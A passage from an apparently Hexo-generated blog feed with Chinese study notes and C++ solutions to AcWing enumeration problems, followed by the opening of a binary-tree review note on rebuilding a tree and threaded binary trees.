class="hljs-number">1</span>;j&lt;=n;j++)   flag[s1[j][i] - <span class="hljs-string">&#x27;A&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            <span class="hljs-keyword">if</span>(flag[s2[j][i] - <span class="hljs-string">&#x27;A&#x27;</span>] == <span class="hljs-number">1</span>)<br>            &#123;<br>                x=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        <span class="hljs-keyword">if</span>(x==<span class="hljs-number">0</span>)    ans++;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1762-牛的洗牌"><a href="#AcWing-1762-牛的洗牌" class="headerlink" title="AcWing 1762. 牛的洗牌"></a><a href="https://www.acwing.com/problem/content/1764/">AcWing 1762. 牛的洗牌</a></h2><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>题目给出排列后的顺序序列，要求还原出排列前的，因此我们可以按照给定的序列进行逆转即可，例如本来是奶牛从i位置去到j位置，现在逆向以后便成为了j位置的奶牛去i位置，假设用数组<code>a</code>保存序列，<code>b</code>序列记录最终位置，<code>c</code>序列记录三次逆序以后的位置。<br>由此可得，原来位于i位置的奶牛经过一次洗牌舞后会到<code>a[i]</code>位置，推理可得三次逆序后会到的位置序号为<code>a[a[a[i]]]</code>，因此编写程序对已知序列按照上述逻辑逆序即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(n+<span class="hljs-number">1</span>)</span>, <span class="hljs-title">b</span><span class="hljs-params">(n+<span class="hljs-number">1</span>)</span>, <span class="hljs-title">c</span><span class="hljs-params">(n+<span class="hljs-number">1</span>)</span></span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> j;<br>        cin&gt;&gt;j;<br>        a[j]=i;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        cin&gt;&gt;b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        c[a[a[a[i]]]]=b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        cout&lt;&lt;c[i]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1750-救生员"><a href="#AcWing-1750-救生员" class="headerlink" title="AcWing 1750. 救生员"></a><a href="https://www.acwing.com/problem/content/1752/">AcWing 1750. 救生员</a></h2><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>本题主要分析方法也还是使用枚举的方法，逐个奶牛进行解雇后对区间覆盖长度（有效工作时间区间段）进行判断。</p><p>使用<code>last</code>变量记录上一个奶牛工作结束时间，如果当前奶牛开始的时间大于<code>last</code>，则其有效工作时间即为<code>[start, end]</code>；若结束时间大于<code>last</code>，则<code>[last, end]</code>为其有效工作时间。最后根据枚举结果输出最长覆盖长度即可。</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">time</span>(n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        cin&gt;&gt;time[i].first&gt;&gt;time[i].second;<br>    <span class="hljs-built_in">sort</span>(time.<span class="hljs-built_in">begin</span>(), time.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> last=<span class="hljs-number">-1</span>, sum=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(j==i)    <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-type">int</span> start = time[j].first, end=time[j].second;<br>            <span class="hljs-keyword">if</span>(start &gt; last)<br>            &#123;<br>                sum+=end-start;<br>                last=end;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(last&lt;end)<br>            &#123;<br>                sum+=end-last;<br>                last=end;<br>            &#125;<br>        &#125;<br>        res=<span class="hljs-built_in">max</span>(res, sum);<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1460-我在哪？"><a href="#AcWing-1460-我在哪？" class="headerlink" title="AcWing 1460. 我在哪？"></a><a href="https://www.acwing.com/problem/content/1462/">AcWing 1460. 我在哪？</a></h2><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>枚举，利用<code>unordered_set</code>从短到长依次遍历尝试不同长度的串，如果能找到相同存在的则说明不可以唯一判定，即跳出循环，否则就可以认为当前长度可以唯一判断，直接输出即可。</p><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">int</span> i, j;<br>    string s;<br>    cin&gt;&gt;n&gt;&gt;s;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        unordered_set&lt;string&gt; S;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;=n-i;j++)<br>        &#123;<br>            string tmp = s.<span class="hljs-built_in">substr</span>(j, i);<br>            <span class="hljs-keyword">if</span>(S.<span class="hljs-built_in">count</span>(tmp))    <br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            S.<span class="hljs-built_in">insert</span>(tmp);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(j==n-i+<span class="hljs-number">1</span>)<br>        &#123;<br>            cout&lt;&lt;i&lt;&lt;endl;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1443-拍照"><a href="#AcWing-1443-拍照" class="headerlink" title="AcWing 1443. 拍照"></a><a href="https://www.acwing.com/problem/content/1445/">AcWing 1443. 拍照</a></h2><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>这里依然是使用枚举的方法，我们先假定已知了<code>a[1]</code>（由于要求字典序从小到大，这里通过从小到大枚举实现），然后便可以依照b与a的关系推出后续的各个数据。</p><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">1010</span>;<br><br><span class="hljs-type">int</span> a[MAXN], b[MAXN];<br><span class="hljs-type">int</span> flag[MAXN];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>        cin&gt;&gt;b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;b[<span class="hljs-number">1</span>];i++)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span> ,<span class="hljs-built_in">sizeof</span>(flag));<br>        <span class="hljs-type">bool</span> res = <span class="hljs-literal">true</span>;<br>        a[<span class="hljs-number">1</span>]=i;<br>        flag[i]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">2</span>;j&lt;=n;j++)<br>        &#123;<br>            <span class="hljs-type">int</span> t=b[j<span class="hljs-number">-1</span>]-a[j<span class="hljs-number">-1</span>];<br>            <span class="hljs-keyword">if</span>(!flag[t] &amp;&amp; t&gt;=<span class="hljs-number">1</span> &amp;&amp; t&lt;=n)<br>            &#123;<br>                a[j]=t;<br>                flag[t]=<span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                res=<span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(res)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>                cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1672-疯狂的科学"><a href="#AcWing-1672-疯狂的科学" class="headerlink" title="AcWing 1672. 疯狂的科学"></a><a href="https://www.acwing.com/problem/content/1674/">AcWing 1672. 疯狂的科学</a></h2><h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>枚举，分段找到连续的相反的一段，算作一次变换即可。</p><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>string a,b;<br><span class="hljs-type">int</span> n, res;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;a&gt;&gt;b;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(a[i] == b[i])    <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-type">int</span> j=i;<br>        <span class="hljs-keyword">while</span>(a[j]!=b[j])   j++;<br>        res++;<br>        i=j<span class="hljs-number">-1</span>;<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1660-社交距离II"><a href="#AcWing-1660-社交距离II" class="headerlink" title="AcWing 1660. 社交距离II"></a><a href="https://www.acwing.com/problem/content/1662/">AcWing 1660. 社交距离II</a></h2><h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>枚举，双指针找最小范围</p><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; a;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> x,s;<br>        cin&gt;&gt;x&gt;&gt;s;<br>        a.<span class="hljs-built_in">push_back</span>(&#123;x, s&#125;);<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(a.<span class="hljs-built_in">begin</span>(), a.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> r=<span class="hljs-number">1e6</span>;<br>    <span class="hljs-type">int</span> s=a[<span class="hljs-number">0</span>].second;<span class="hljs-comment">//牛的生病状态</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(s!=a[i].second)<br>        &#123;<br>            r=<span class="hljs-built_in">min</span>(r, a[i].first-a[i<span class="hljs-number">-1</span>].first);<br>        &#125;<br>        s=a[i].second;<br>    &#125;<br>    r--;<br>    <br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(x==<span class="hljs-number">-1</span> &amp;&amp; a[i].second)    <br>        &#123;<br>            x=a[i].first;<br>            cnt++;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x!=<span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(a[i].first-x&lt;=r)<br>            &#123;<br>                x=a[i].first;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i].second)<br>            &#123;<br>                cnt++;<br>                x=a[i].first;<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;cnt&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-3347-菊花链"><a href="#AcWing-3347-菊花链" class="headerlink" title="AcWing 3347. 菊花链"></a><a href="https://www.acwing.com/problem/content/3350/">AcWing 3347. 菊花链</a></h2><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">110</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> p[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        cin&gt;&gt;p[i];<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; H;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i, s=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            s+=p[j];<br>            H.<span class="hljs-built_in">insert</span>(p[j]);<br>            <span class="hljs-type">int</span> cnt = j-i+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(s%cnt == <span class="hljs-number">0</span> &amp;&amp; H.<span class="hljs-built_in">count</span>(s/cnt))    res++;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 假期学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树结构复习笔记</title>
      <link href="/2021/11/1fbca4b4.html"/>
      <url>/2021/11/1fbca4b4.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-重建二叉树"><a href="#1-重建二叉树" class="headerlink" title="1. 重建二叉树"></a>1. 重建二叉树</h1><p>输入一棵二叉树前序遍历和中序遍历的结果，重建该二叉树。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; pos;<br>    vector&lt;<span class="hljs-type">int</span>&gt; preorder, inorder;<br>    <br>    <span class="hljs-function">TreeNode* <span class="hljs-title">build</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(a&gt;b) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">auto</span> root=<span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(preorder[a]);<br>        <span class="hljs-type">int</span> k=pos[root-&gt;val];<br>        root-&gt;left=<span class="hljs-built_in">build</span>(a+<span class="hljs-number">1</span>, a+<span class="hljs-number">1</span>+k<span class="hljs-number">-1</span>-x ,x, k<span class="hljs-number">-1</span>);<br>        root-&gt;right=<span class="hljs-built_in">build</span>(a+<span class="hljs-number">1</span>+k<span class="hljs-number">-1</span>-x+<span class="hljs-number">1</span>, b, k+<span class="hljs-number">1</span>, y);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; _preorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; _inorder)</span> </span>&#123;<br>        preorder=_preorder, inorder=_inorder;<br>        <span class="hljs-type">int</span> n=inorder.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;inorder.<span class="hljs-built_in">size</span>();i++)   pos[inorder[i]]=i;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">build</span>(<span class="hljs-number">0</span>, n<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, n<span class="hljs-number">-1</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="7078-线索二叉树，中序遍历"><a href="#7078-线索二叉树，中序遍历" class="headerlink" title="7078(线索二叉树，中序遍历)"></a>7078(线索二叉树，中序遍历)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BThrNode</span>&#123;</span><br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-class"><span 